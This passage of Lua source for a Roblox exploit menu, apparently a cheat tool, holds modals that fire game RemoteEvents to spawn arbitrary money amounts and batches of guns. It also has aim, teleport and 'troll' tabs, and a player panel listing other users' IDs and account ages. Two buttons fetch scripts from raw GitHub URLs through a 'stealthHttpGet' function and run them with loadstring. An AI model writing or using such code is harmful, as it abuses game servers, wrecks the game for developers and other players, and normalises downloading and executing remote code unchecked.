    valueLabel.Font = Enum.Font.GothamBold
    valueLabel.TextXAlignment = Enum.TextXAlignment.Right
    valueLabel.Parent = container
    
    local sliderBack = Instance.new("Frame")
    sliderBack.Name = "SliderBack"
    sliderBack.Size = UDim2.new(1, -30, 0, 6)
    sliderBack.Position = UDim2.new(0, 15, 1, -20)
    sliderBack.BackgroundColor3 = Config.Theme.Border
    sliderBack.BorderSizePixel = 0
    sliderBack.Parent = container
    
    Utils.RoundCorners(sliderBack, 3)
    
    local sliderFill = Instance.new("Frame")
    sliderFill.Name = "SliderFill"
    sliderFill.Size = UDim2.new((default - min) / (max - min), 0, 1, 0)
    sliderFill.BackgroundColor3 = Config.Theme.Accent
    sliderFill.BorderSizePixel = 0
    sliderFill.Parent = sliderBack
    
    Utils.RoundCorners(sliderFill, 3)

    local sliderHandle = Instance.new("Frame")
    sliderHandle.Name = "SliderHandle"
    sliderHandle.Size = UDim2.new(0, 15, 0, 15)
    sliderHandle.Position = UDim2.new((default - min) / (max - min), 0, 0.5, 0)
    sliderHandle.AnchorPoint = Vector2.new(0.5, 0.5)
    sliderHandle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    sliderHandle.BorderSizePixel = 0
    sliderHandle.Parent = sliderBack
    Utils.RoundCorners(sliderHandle, 3)
    
    local dragging = false
    
    local function updateSlider(input)
        local relativeX = math.clamp((input.Position.X - sliderBack.AbsolutePosition.X) / sliderBack.AbsoluteSize.X, 0, 1)
        local value = math.floor(min + (max - min) * relativeX)
        
        sliderFill.Size = UDim2.new(relativeX, 0, 1, 0)
        sliderHandle.Position = UDim2.new(relativeX, 0, 0.5, 0)
        valueLabel.Text = tostring(value)
        
        if callback then
            callback(value)
        end
    end

    if not _G.SliderDragging then
        _G.SliderDragging = {}
    end
    
    sliderBack.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            _G.SliderDragging[container] = true
            updateSlider(input)
        end
    end)
    
    sliderHandle.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            _G.SliderDragging[container] = true
        end
    end)
    
    sliderBack.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = false
            _G.SliderDragging[container] = false
        end
    end)
    
    uis.InputChanged:Connect(function(input)
        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
            updateSlider(input)
        end
    end)
    
    uis.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = false
            _G.SliderDragging[container] = false
        end
    end)
    
    return container
end

function Components.CreateMoneyModal(rn, gr, ba)
    local mg = Instance.new("ScreenGui")
    mg.Name = rn:gsub(" ", "") .. "MoneyModal"
    mg.ResetOnSpawn = false
    mg.Parent = pg
    
    local cr = nil
    task.spawn(function()
        cr = gr()
    end)
    
    local md = Instance.new("Frame")
    md.Size = UDim2.new(0, 280, 0, 180)
    md.Position = UDim2.new(0.5, -140, 0.5, -90)
    md.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    md.BorderSizePixel = 0
    md.Parent = mg
    Utils.RoundCorners(md, 10)
    Utils.MakeDraggable(md)
    
    local tl = Instance.new("TextLabel")
    tl.Size = UDim2.new(1, -40, 0, 35)
    tl.Position = UDim2.new(0, 10, 0, 5)
    tl.BackgroundTransparency = 1
    tl.Text = "SPAWN MONEY"
    tl.TextColor3 = Color3.fromRGB(255, 255, 255)
    tl.TextSize = 14
    tl.Font = Enum.Font.GothamBold
    tl.TextXAlignment = Enum.TextXAlignment.Center
    tl.Parent = md
    
    local cb = Instance.new("TextButton")
    cb.Size = UDim2.new(0, 28, 0, 28)
    cb.Position = UDim2.new(1, -33, 0, 7)
    cb.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    cb.BorderSizePixel = 0
    cb.Text = "x"
    cb.TextColor3 = Color3.fromRGB(255, 255, 255)
    cb.TextSize = 12
    cb.Font = Enum.Font.GothamBold
    cb.Parent = md
    Utils.RoundCorners(cb, 6)
    
    cb.MouseButton1Click:Connect(function()
        mg:Destroy()
    end)
    
    local il = Instance.new("TextLabel")
    il.Size = UDim2.new(1, -20, 0, 18)
    il.Position = UDim2.new(0, 10, 0, 40)
    il.BackgroundTransparency = 1
    il.Text = "Enter amount to add:"
    il.TextColor3 = Color3.fromRGB(200, 200, 200)
    il.TextSize = 11
    il.Font = Enum.Font.Gotham
    il.TextXAlignment = Enum.TextXAlignment.Left
    il.Parent = md
    
    local ab = Instance.new("TextBox")
    ab.Size = UDim2.new(1, -20, 0, 30)
    ab.Position = UDim2.new(0, 10, 0, 60)
    ab.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
    ab.BorderSizePixel = 0
    ab.Text = ""
    ab.PlaceholderText = "e.g., 100000"
    ab.TextColor3 = Color3.fromRGB(255, 255, 255)
    ab.PlaceholderColor3 = Color3.fromRGB(120, 120, 120)
    ab.TextSize = 20
    ab.Font = Enum.Font.Gotham
    ab.TextXAlignment = Enum.TextXAlignment.Center
    ab.ClearTextOnFocus = false
    ab.Parent = md
    Utils.RoundCorners(ab, 6)

    local quickChoices = {1000000, 50000000, 100000000}
    local quickLabels = {"1M", "50M", "100M"}
    local quickButtons = {}
    
    for i = 1, 3 do
        local qb = Instance.new("TextButton")
        qb.Size = UDim2.new(0, 75, 0, 22)
        qb.Position = UDim2.new(0, 10 + (i - 1) * 85, 0, 95)
        qb.BackgroundTransparency = 1
        qb.BorderSizePixel = 0
        qb.Text = quickLabels[i]
        qb.TextColor3 = Config.Theme.Text
        qb.TextSize = 10
        qb.Font = Enum.Font.Gotham
        qb.Parent = md
        
        qb.MouseButton1Click:Connect(function()
            ab.Text = tostring(quickChoices[i])
        end)
        
        quickButtons[i] = qb
    end
    
    local sb = Instance.new("TextButton")
    sb.Size = UDim2.new(1, -20, 0, 30)
    sb.Position = UDim2.new(0, 10, 0, 122)
    sb.BackgroundTransparency = 1
    sb.BorderSizePixel = 0
    sb.Text = "EXECUTE"
    sb.TextColor3 = Config.Theme.Text
    sb.TextSize = 12
    sb.Font = Enum.Font.GothamBold
    sb.TextXAlignment = Enum.TextXAlignment.Center
    sb.Parent = md
    
    sb.MouseButton1Click:Connect(function()
        local am = tonumber(ab.Text)
        if am and am > 0 then
            task.spawn(function()
                local rm = cr or gr()
                if not cr then
                    cr = rm
                end
                
                local ag = ba(am)
                rm:FireServer(unpack(ag))
            end)
        else
        end
    end)
    
    ab:CaptureFocus()
end

function Components.CreateGunModal(rn, gr, ba, gn)
    local gg = Instance.new("ScreenGui")
    gg.Name = rn:gsub(" ", "") .. "GunModal"
    gg.ResetOnSpawn = false
    gg.Parent = pg
    
    local cr = nil
    task.spawn(function()
        cr = gr()
    end)
    
    local md = Instance.new("Frame")
    md.Size = UDim2.new(0, 280, 0, 190)
    md.Position = UDim2.new(0.5, -140, 0.5, -110)
    md.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    md.BorderSizePixel = 0
    md.Parent = gg
    Utils.RoundCorners(md, 10)
    Utils.MakeDraggable(md)
    
    local tl = Instance.new("TextLabel")
    tl.Size = UDim2.new(1, -40, 0, 35)
    tl.Position = UDim2.new(0, 10, 0, 5)
    tl.BackgroundTransparency = 1
    tl.Text = "SPAWN " .. (gn or "GUN")
    tl.TextColor3 = Color3.fromRGB(255, 255, 255)
    tl.TextSize = 14
    tl.Font = Enum.Font.GothamBold
    tl.TextXAlignment = Enum.TextXAlignment.Center
    tl.Parent = md
    
    local cb = Instance.new("TextButton")
    cb.Size = UDim2.new(0, 28, 0, 28)
    cb.Position = UDim2.new(1, -33, 0, 7)
    cb.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    cb.BorderSizePixel = 0
    cb.Text = "x"
    cb.TextColor3 = Color3.fromRGB(255, 255, 255)
    cb.TextSize = 12
    cb.Font = Enum.Font.GothamBold
    cb.Parent = md
    Utils.RoundCorners(cb, 6)
    
    cb.MouseButton1Click:Connect(function()
        gg:Destroy()
    end)
    
    local ql = Instance.new("TextLabel")
    ql.Size = UDim2.new(1, -20, 0, 18)
    ql.Position = UDim2.new(0, 10, 0, 40)
    ql.BackgroundTransparency = 1
    ql.Text = "Enter quantity:"
    ql.TextColor3 = Color3.fromRGB(200, 200, 200)
    ql.TextSize = 11
    ql.Font = Enum.Font.Gotham
    ql.TextXAlignment = Enum.TextXAlignment.Left
    ql.Parent = md
    
    local qb = Instance.new("TextBox")
    qb.Size = UDim2.new(1, -20, 0, 30)
    qb.Position = UDim2.new(0, 10, 0, 60)
    qb.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
    qb.BorderSizePixel = 0
    qb.Text = "1"
    qb.PlaceholderText = "e.g., 5"
    qb.TextColor3 = Color3.fromRGB(255, 255, 255)
    qb.PlaceholderColor3 = Color3.fromRGB(120, 120, 120)
    qb.TextSize = 20
    qb.Font = Enum.Font.Gotham
    qb.TextXAlignment = Enum.TextXAlignment.Center
    qb.ClearTextOnFocus = false
    qb.Parent = md
    Utils.RoundCorners(qb, 6)
    
    local ade = false
    local adf = Instance.new("Frame")
    adf.Size = UDim2.new(1, -20, 0, 30)
    adf.Position = UDim2.new(0, 10, 0, 100)
    adf.BackgroundTransparency = 1
    adf.Parent = md
    
    local adc = Instance.new("TextButton")
    adc.Size = UDim2.new(0, 20, 0, 20)
    adc.Position = UDim2.new(0, 0, 0, 5)
    adc.BackgroundTransparency = 1
    adc.BorderSizePixel = 0
    adc.Text = ""
    adc.Parent = adf
    
    local cm = Instance.new("TextLabel")
    cm.Size = UDim2.new(1, 0, 1, 0)
    cm.Position = UDim2.new(0, 0, 0, 0)
    cm.BackgroundTransparency = 1
    cm.Text = "+"
    cm.TextColor3 = Color3.fromRGB(0, 255, 0)
    cm.TextSize = 16
    cm.Font = Enum.Font.GothamBold
    cm.Visible = false
    cm.Parent = adc
    
    local adl = Instance.new("TextLabel")
    adl.Size = UDim2.new(1, -30, 1, 0)
    adl.Position = UDim2.new(0, 30, 0, 0)
    adl.BackgroundTransparency = 1
    adl.Text = "AUTO-DROP"
    adl.TextColor3 = Color3.fromRGB(200, 200, 200)
    adl.TextSize = 11
    adl.Font = Enum.Font.Gotham
    adl.TextXAlignment = Enum.TextXAlignment.Left
    adl.Parent = adf
    
    adc.MouseButton1Click:Connect(function()
        ade = not ade
        if ade then
            adc.Text = "✓"
            adc.TextColor3 = Color3.fromRGB(0, 255, 0)
            cm.Visible = true
        else
            adc.Text = ""
            adc.TextColor3 = Config.Theme.Text
            cm.Visible = false
        end
    end)
    
    local sb = Instance.new("TextButton")
    sb.Size = UDim2.new(1, -20, 0, 30)
    sb.Position = UDim2.new(0, 10, 0, 140)
    sb.BackgroundTransparency = 1
    sb.BorderSizePixel = 0
    sb.Text = "EXECUTE"
    sb.TextColor3 = Config.Theme.Text
    sb.TextSize = 12
    sb.Font = Enum.Font.GothamBold
    sb.TextXAlignment = Enum.TextXAlignment.Center
    sb.Parent = md
    
    sb.MouseButton1Click:Connect(function()
        local qt = tonumber(qb.Text) or 1
        if qt <= 0 then qt = 1 end
        if qt > 100 then qt = 100 end
        
        if qt and qt > 0 then
            task.spawn(function()
                local rm = cr or gr()
                if not cr then
                    cr = rm
                end
                
                for i = 1, qt do
                    local ag = ba(gn)
                    pcall(function()
                        rm:FireServer(unpack(ag))
                    end)
                    
                    if ade then
                        task.wait(0.5)
                        local ch = lp.Character
                        local bp = lp.Backpack
                        
                        if ch then
                            local hu = ch:FindFirstChildOfClass("Humanoid")
                            
                            local ft = nil
                            for _, t in ipairs(ch:GetChildren()) do
                                if t:IsA("Tool") then
                                    local tn = t.Name:lower()
                                    local gnl = (gn or ""):lower()
                                    if tn:find(gnl, 1, true) or tn == gnl or tn:match(gnl) then
                                        ft = t
                                        break
                                    end
                                end
                            end
                            
                            if not ft and bp then
                                for _, t in ipairs(bp:GetChildren()) do
                                    if t:IsA("Tool") then
                                        local tn = t.Name:lower()
                                        local gnl = (gn or ""):lower()
                                        if tn:find(gnl, 1, true) or tn == gnl or tn:match(gnl) then
                                            ft = t
                                            break
                                        end
                                    end
                                end
                            end
                            
                            if ft then
                                pcall(function()
                                    if ft.Parent == ch and hu then
                                        hu:UnequipTools()
                                        task.wait(0.3)
                                        if bp then
                                            ft = bp:FindFirstChild(ft.Name) or ft
                                        end
                                    end
                                    
                                    if ft then
                                        local rp = ch:FindFirstChild("HumanoidRootPart") or ch:FindFirstChild("Torso")
                                        
                                        ft.Parent = workspace
                                        
                                        if rp and ft:FindFirstChild("Handle") then
                                            local hd = ft.Handle
                                            local ra = math.random() * math.pi * 2
                                            local ox = math.sin(ra) * 3
                                            local oz = math.cos(ra) * 3
                                            hd.CFrame = rp.CFrame * CFrame.new(ox, 1, oz) * CFrame.Angles(0, ra, 0)
                                            if hd:IsA("BasePart") then
                                                hd.Velocity = Vector3.new(0, -2, 0)
                                            end
                                        end
                                    end
                                end)
                            end
                        end
                    end
                    
                    if i < qt then
                        task.wait(0.2)
                    end
                end
            end)
        else
        end
    end)
    
    qb:CaptureFocus()
    return gg
end

function Components.CreateTextBox(p, ph, cb)
    local cn = Instance.new("Frame")
    cn.Name = "TextBox"
    cn.Size = UDim2.new(1, 0, 0, 40)
    cn.BackgroundColor3 = Config.Theme.Primary
    cn.BackgroundTransparency = 0.3
    cn.BorderSizePixel = 0
    cn.Parent = p
    Utils.RoundCorners(cn, 8)
    
    local tb = Instance.new("TextBox")
    tb.Size = UDim2.new(1, -20, 1, 0)
    tb.Position = UDim2.new(0, 10, 0, 0)
    tb.BackgroundTransparency = 1
    tb.PlaceholderText = ph
    tb.PlaceholderColor3 = Config.Theme.TextDim
    tb.Text = ""
    tb.TextColor3 = Config.Theme.Text
    tb.TextSize = 20
    tb.Font = Enum.Font.GothamMedium
    tb.TextXAlignment = Enum.TextXAlignment.Center
    tb.ClearTextOnFocus = false
    tb.Parent = cn
    
    tb.FocusLost:Connect(function()
        if cb then
            cb(tb.Text)
        end
    end)
    
    return cn
end

function Components.CreateDropdown(parent, text, options, callback)
    local container = Instance.new("Frame")
    container.Name = "Dropdown"
    container.Size = UDim2.new(1, 0, 0, 40)
    container.BackgroundColor3 = Config.Theme.Primary
    container.BackgroundTransparency = 0.3
    container.BorderSizePixel = 0
    container.Parent = parent
    
    Utils.RoundCorners(container, 8)
    
    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(0.5, -10, 1, 0)
    label.Position = UDim2.new(0, 15, 0, 0)
    label.BackgroundTransparency = 1
    label.Text = text
    label.TextColor3 = Config.Theme.Text
    label.TextSize = 13
    label.Font = Enum.Font.GothamMedium
    label.TextXAlignment = Enum.TextXAlignment.Left
    label.Parent = container
    
    local button = Instance.new("TextButton")
    button.Name = "DropdownButton"
    button.Size = UDim2.new(0.5, -25, 0, 30)
    button.Position = UDim2.new(0.5, 5, 0.5, -15)
    button.BackgroundColor3 = Config.Theme.Secondary
    button.BorderSizePixel = 0
    button.Text = options[1] or "Select"
    button.TextColor3 = Config.Theme.Text
    button.TextSize = 12
    button.Font = Enum.Font.GothamMedium
    button.Parent = container
    
    Utils.RoundCorners(button, 6)

    local arrow = Instance.new("TextLabel")
    arrow.Size = UDim2.new(0, 20, 1, 0)
    arrow.Position = UDim2.new(1, -20, 0, 0)
    arrow.BackgroundTransparency = 1
    arrow.Text = "▼"
    arrow.TextColor3 = Config.Theme.TextDim
    arrow.TextSize = 10
    arrow.Font = Enum.Font.GothamBold
    arrow.Parent = button
    
    local expanded = false
    local optionsList = Instance.new("ScrollingFrame")
    optionsList.Name = "OptionsList"
    optionsList.Size = UDim2.new(0.5, -25, 0, 0)
    optionsList.Position = UDim2.new(0.5, 5, 1, 5)
    optionsList.BackgroundColor3 = Config.Theme.Secondary
    optionsList.BorderSizePixel = 0
    optionsList.ClipsDescendants = true
    optionsList.Visible = false
    optionsList.ZIndex = 100
    optionsList.ScrollBarThickness = 4
    optionsList.ScrollBarImageColor3 = Config.Theme.Border
    optionsList.CanvasSize = UDim2.new(0, 0, 0, #options * 30)
    optionsList.Parent = container
    
    Utils.RoundCorners(optionsList, 6)
    Utils.AddStroke(optionsList, Config.Theme.Border, 1)
    
    local optionsLayout = Instance.new("UIListLayout")
    optionsLayout.SortOrder = Enum.SortOrder.LayoutOrder
    optionsLayout.Parent = optionsList
    
    for i, option in ipairs(options) do
        local optionButton = Instance.new("TextButton")
        optionButton.Name = "Option_" .. i
        optionButton.Size = UDim2.new(1, 0, 0, 30)
        optionButton.BackgroundColor3 = Config.Theme.Secondary
        optionButton.BorderSizePixel = 0
        optionButton.Text = option
        optionButton.TextColor3 = Config.Theme.Text
        optionButton.TextSize = 12
        optionButton.Font = Enum.Font.GothamMedium
        optionButton.ZIndex = 101
        optionButton.Parent = optionsList
        
        optionButton.MouseButton1Click:Connect(function()
            button.Text = option
            expanded = false
            arrow.Text = "▼"
            local tween = Utils.CreateTween(optionsList, {Size = UDim2.new(0.5, -25, 0, 0)})
            tween:Play()
            tween.Completed:Wait()
            optionsList.Visible = false
            
            if callback then
                callback(option, i)
            end
        end)
    end
    
    button.MouseButton1Click:Connect(function()
        expanded = not expanded
        if expanded then
            arrow.Text = "▲"
            optionsList.Visible = true
            local maxHeight = math.min(#options * 30, 150)
            Utils.CreateTween(optionsList, {Size = UDim2.new(0.5, -25, 0, maxHeight)}):Play()
        else
            arrow.Text = "▼"
            local tween = Utils.CreateTween(optionsList, {Size = UDim2.new(0.5, -25, 0, 0)})
            tween:Play()
            tween.Completed:Wait()
            optionsList.Visible = false
        end
    end)
    
    return container
end

function Components.CreateLabel(p, t, c)
    local lb = Instance.new("TextLabel")
    lb.Name = "Label"
    lb.Size = UDim2.new(1, 0, 0, 25)
    lb.BackgroundTransparency = 1
    lb.Text = t
    lb.TextColor3 = c or Config.Theme.Text
    lb.TextSize = 15
    lb.Font = Enum.Font.GothamBold
    lb.TextXAlignment = Enum.TextXAlignment.Left
    lb.Parent = p
    
    return lb
end

function Components.CreateDivider(p)
    local dv = Instance.new("Frame")
    dv.Name = "Divider"
    dv.Size = UDim2.new(1, 0, 0, 1)
    dv.BackgroundColor3 = Config.Theme.Border
    dv.BorderSizePixel = 0
    dv.Parent = p
    
    return dv
end

local Menu = {}

function Menu.Build()
    local screenGui = GUI.CreateScreenGui()
    local mainFrame = GUI.CreateMainFrame(screenGui)

    if _G.Flag1 then

        screenGui.Enabled = true
        return
    end
    
    GUI.CreateTopBar(mainFrame)
    GUI.CreateUserInfo(mainFrame)
    
    local tabContainer = GUI.CreateTabContainer(mainFrame)
    local contentContainer = GUI.CreateContentContainer(mainFrame)

    local tabs = {}
    local contents = {}
    
    local tabData = {
        {name = "HOME", icon = "›"},
        {name = "AIM UNIVERSAL", icon = "›"},
        {name = "PLAYER", icon = "›"},
        {name = "TELEPORT", icon = "›"},
        {name = "TROLL", icon = "›"},
        {name = "RP MENU", icon = "›"},
        {name = "SETTINGS", icon = "›"},
    }
    
    for i, data in ipairs(tabData) do
        tabs[data.name] = GUI.CreateTab(tabContainer, data.name, data.icon, i)
        contents[data.name] = GUI.CreateTabContent(contentContainer, data.name)
    end

    local currentTab = nil
    
    local function switchTab(tabName)
        if currentTab == tabName then return end
        
        for name, tab in pairs(tabs) do
            if name == tabName then

                tab.BackgroundTransparency = 1
                tab.TextColor3 = Config.Theme.Text
                contents[name].Visible = true
            else

                tab.BackgroundTransparency = 1
                tab.TextColor3 = Config.Theme.TextDim
                contents[name].Visible = false
            end
        end
        
        currentTab = tabName
    end
    
    for name, tab in pairs(tabs) do
        tab.MouseButton1Click:Connect(function()
            switchTab(name)
        end)
    end

    Components.CreateLabel(contents.HOME, "HOME MISC", Config.Theme.Accent)
    
    Components.CreateButton(contents.HOME, "DEX EXPLORER", function()

        task.spawn(function()
            local scriptCode = stealthHttpGet("https://raw.githubusercontent.com/peyton2465/Dex/master/out.lua")
            if scriptCode then
                pcall(function()
                    loadstring(scriptCode)()
                end)
            end
        end)
    end)
    
    Components.CreateButton(contents.HOME, "INFINITY YIELD", function()

        task.spawn(function()
            local scriptCode = stealthHttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source")
            if scriptCode then
                pcall(function()
                    loadstring(scriptCode)()
                end)
            end
        end)
    end)
    
    
    
    Components.CreateButton(contents.HOME, "SHOW PLAYER LIST", function()
        local eg = _G.Gui2
        if eg then
            eg:Destroy()
        end
        
        local plg = Instance.new("ScreenGui")
        plg.Name = math.random(10000,99999)
        _G.Gui2 = plg
        plg.ResetOnSpawn = false
        plg.Parent = pg
        
        local pl = {}
        for _, p in pairs(ps:GetPlayers()) do
            table.insert(pl, p)
        end
        
        local mmh = 400
        local ch = 60 + (#pl * 35)
        local mh = math.min(ch, mmh)
        
        local mf = Instance.new("Frame")
        mf.Size = UDim2.new(0, 320, 0, mh)
        mf.Position = UDim2.new(0.5, -160, 0.5, -mh/2)
        mf.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        mf.BorderSizePixel = 0
        mf.Parent = plg
        Utils.RoundCorners(mf, 12)
        Utils.MakeDraggable(mf)
        
        local tl = Instance.new("TextLabel")
        tl.Size = UDim2.new(1, -40, 0, 40)
        tl.Position = UDim2.new(0, 10, 0, 10)
        tl.BackgroundTransparency = 1
        tl.Text = "Player List - " .. #pl .. " Players"
        tl.TextColor3 = Color3.fromRGB(255, 255, 255)
        tl.TextSize = 16
        tl.Font = Enum.Font.GothamBold
        tl.TextXAlignment = Enum.TextXAlignment.Center
        tl.Parent = mf
        
        local cb = Instance.new("TextButton")
        cb.Size = UDim2.new(0, 30, 0, 30)
        cb.Position = UDim2.new(1, -35, 0, 10)
        cb.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
        cb.BorderSizePixel = 0
        cb.Text = "X"
        cb.TextColor3 = Color3.fromRGB(255, 255, 255)
        cb.TextSize = 14
        cb.Font = Enum.Font.GothamBold
        cb.Parent = mf
        Utils.RoundCorners(cb, 8)
        
        cb.MouseButton1Click:Connect(function()
            plg:Destroy()
        end)
        
        local sf = Instance.new("ScrollingFrame")
        sf.Size = UDim2.new(1, -20, 1, -70)
        sf.Position = UDim2.new(0, 10, 0, 55)
        sf.BackgroundTransparency = 1
        sf.BorderSizePixel = 0
        sf.ScrollBarThickness = 6
        sf.ScrollBarImageColor3 = Color3.fromRGB(255, 255, 255)
        sf.CanvasSize = UDim2.new(0, 0, 0, #pl * 35)
        sf.Parent = mf

        local playerPositions = {}
        local playerLastMove = {}
        local statusLabels = {}

        local function getPlayerStatus(player)
            if not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") then
                return "OFFLINE"
            end
            
            local hrp = player.Character.HumanoidRootPart
            local currentPos = hrp.Position
            local lastPos = playerPositions[player.UserId]
            local lastMoveTime = playerLastMove[player.UserId] or 0
            local currentTime = tick()
            
            if lastPos then
                local distance = (currentPos - lastPos).Magnitude
                if distance < 0.5 then

                    local idleTime = currentTime - lastMoveTime
                    if idleTime > 60 then
                        return "AFK"
                    elseif idleTime > 15 then
                        return "IDLE"
                    else
                        return "ACTIVE"
                    end
                else

                    playerLastMove[player.UserId] = currentTime
                    return "ACTIVE"
                end
            else

                playerLastMove[player.UserId] = currentTime
                return "ACTIVE"
            end
        end

        for _, p in pairs(pl) do
            if p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
                playerPositions[p.UserId] = p.Character.HumanoidRootPart.Position
                playerLastMove[p.UserId] = tick()
            end
        end
        
        for i, p in ipairs(pl) do
            local pb = Instance.new("Frame")
            pb.Size = UDim2.new(1, -10, 0, 30)
            pb.Position = UDim2.new(0, 0, 0, (i-1) * 35)
            pb.BackgroundTransparency = 1
            pb.BorderSizePixel = 0
            pb.Parent = sf

            local nameLabel = Instance.new("TextLabel")
            nameLabel.Size = UDim2.new(0, 120, 0, 30)
            nameLabel.Position = UDim2.new(0, 5, 0, 0)
            nameLabel.BackgroundTransparency = 1
            nameLabel.Text = p.Name
            nameLabel.TextColor3 = Config.Theme.Text
            nameLabel.TextSize = 12
            nameLabel.Font = Enum.Font.Gotham
            nameLabel.TextXAlignment = Enum.TextXAlignment.Left
            nameLabel.TextTruncate = Enum.TextTruncate.AtEnd
            nameLabel.Parent = pb

            local statusLabel = Instance.new("TextLabel")
            statusLabel.Size = UDim2.new(0, 65, 0, 22)
            statusLabel.Position = UDim2.new(0, 130, 0.5, -11)
            statusLabel.BackgroundTransparency = 1
            statusLabel.Text = "ACTIVE"
            statusLabel.TextColor3 = Config.Theme.Text
            statusLabel.TextSize = 10
            statusLabel.Font = Enum.Font.GothamBold
            statusLabel.TextXAlignment = Enum.TextXAlignment.Left
            statusLabel.Parent = pb
            statusLabels[p.UserId] = statusLabel

            local status = getPlayerStatus(p)
            statusLabel.Text = status

            local cbb = Instance.new("TextButton")
            cbb.Size = UDim2.new(0, 50, 0, 25)
            cbb.Position = UDim2.new(0, 200, 0.5, -12.5)
            cbb.BackgroundTransparency = 1
            cbb.BorderSizePixel = 0
            cbb.Text = "Copy"
            cbb.TextColor3 = Config.Theme.Text
            cbb.TextSize = 11
            cbb.Font = Enum.Font.Gotham
            cbb.Parent = pb

            local vpb = Instance.new("TextButton")
            vpb.Size = UDim2.new(0, 50, 0, 25)
            vpb.Position = UDim2.new(0, 255, 0.5, -12.5)
            vpb.BackgroundTransparency = 1
            vpb.BorderSizePixel = 0
            vpb.Text = "View"
            vpb.TextColor3 = Config.Theme.Text
            vpb.TextSize = 11
            vpb.Font = Enum.Font.Gotham
            vpb.Parent = pb
            
            cbb.MouseButton1Click:Connect(function()
                setclipboard(p.Name)
            end)
            
            vpb.MouseButton1Click:Connect(function()
                local vpg = Instance.new("ScreenGui")
                vpg.Name = math.random(10000,99999)
                vpg.ResetOnSpawn = false
                vpg.Parent = pg
        
                local vpm = Instance.new("Frame")
                vpm.Size = UDim2.new(0, 320, 0, 280)
                vpm.Position = UDim2.new(0.5, -160, 0.5, -140)
                vpm.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                vpm.BorderSizePixel = 0
                vpm.Parent = vpg
                Utils.RoundCorners(vpm, 12)
                Utils.MakeDraggable(vpm)
        
                local vptl = Instance.new("TextLabel")
                vptl.Size = UDim2.new(1, -40, 0, 35)
                vptl.Position = UDim2.new(0, 10, 0, 5)
                vptl.BackgroundTransparency = 1
                vptl.Text = "PROFILE - " .. p.Name
                vptl.TextColor3 = Color3.fromRGB(255, 255, 255)
                vptl.TextSize = 14
                vptl.Font = Enum.Font.GothamBold
                vptl.TextXAlignment = Enum.TextXAlignment.Center
                vptl.Parent = vpm
                
                local vpcb = Instance.new("TextButton")
                vpcb.Size = UDim2.new(0, 28, 0, 28)
                vpcb.Position = UDim2.new(1, -33, 0, 7)
                vpcb.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
                vpcb.BorderSizePixel = 0
                vpcb.Text = "X"
                vpcb.TextColor3 = Color3.fromRGB(255, 255, 255)
                vpcb.TextSize = 12
                vpcb.Font = Enum.Font.GothamBold
                vpcb.Parent = vpm
                Utils.RoundCorners(vpcb, 6)
        
                vpcb.MouseButton1Click:Connect(function()
                    vpg:Destroy()
        end)

                local avatarFrame = Instance.new("Frame")
                avatarFrame.Size = UDim2.new(0, 80, 0, 80)
                avatarFrame.Position = UDim2.new(0.5, 0, 0, 50)
                avatarFrame.AnchorPoint = Vector2.new(0.5, 0)
                avatarFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
                avatarFrame.BorderSizePixel = 0
                avatarFrame.Parent = vpm
                Utils.RoundCorners(avatarFrame, 40)

                local avatarImage = Instance.new("ImageLabel")
                avatarImage.Size = UDim2.new(1, -4, 1, -4)
                avatarImage.Position = UDim2.new(0, 2, 0, 2)
                avatarImage.BackgroundTransparency = 1
                avatarImage.Image = ps:GetUserThumbnailAsync(p.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size150x150)
                avatarImage.Parent = avatarFrame
                Utils.RoundCorners(avatarImage, 38)

                local vpil = Instance.new("TextLabel")
                vpil.Size = UDim2.new(1, -20, 0, 20)
                vpil.Position = UDim2.new(0, 10, 0, 145)
                vpil.BackgroundTransparency = 1
                vpil.Text = "Username: " .. p.Name
                vpil.TextColor3 = Color3.fromRGB(200, 200, 200)
                vpil.TextSize = 12
                vpil.Font = Enum.Font.Gotham
                vpil.TextXAlignment = Enum.TextXAlignment.Left
                vpil.Parent = vpm

                local vpdnl = Instance.new("TextLabel")
                vpdnl.Size = UDim2.new(1, -20, 0, 20)
                vpdnl.Position = UDim2.new(0, 10, 0, 170)
                vpdnl.BackgroundTransparency = 1
                vpdnl.Text = "Display Name: @" .. p.DisplayName
                vpdnl.TextColor3 = Color3.fromRGB(200, 200, 200)
                vpdnl.TextSize = 12
                vpdnl.Font = Enum.Font.Gotham
                vpdnl.TextXAlignment = Enum.TextXAlignment.Left
                vpdnl.Parent = vpm

                local vpidl = Instance.new("TextLabel")
                vpidl.Size = UDim2.new(1, -20, 0, 20)
                vpidl.Position = UDim2.new(0, 10, 0, 195)
                vpidl.BackgroundTransparency = 1
                vpidl.Text = "User ID: " .. p.UserId
                vpidl.TextColor3 = Color3.fromRGB(200, 200, 200)
                vpidl.TextSize = 12
                vpidl.Font = Enum.Font.Gotham
                vpidl.TextXAlignment = Enum.TextXAlignment.Left
                vpidl.Parent = vpm

                local accountAge = p.AccountAge or 0
                local vpaal = Instance.new("TextLabel")
                vpaal.Size = UDim2.new(1, -20, 0, 20)
                vpaal.Position = UDim2.new(0, 10, 0, 220)
                vpaal.BackgroundTransparency = 1
                vpaal.Text = "Account Age: " .. accountAge .. " days"
                vpaal.TextColor3 = Color3.fromRGB(200, 200, 200)
                vpaal.TextSize = 12
                vpaal.Font = Enum.Font.Gotham
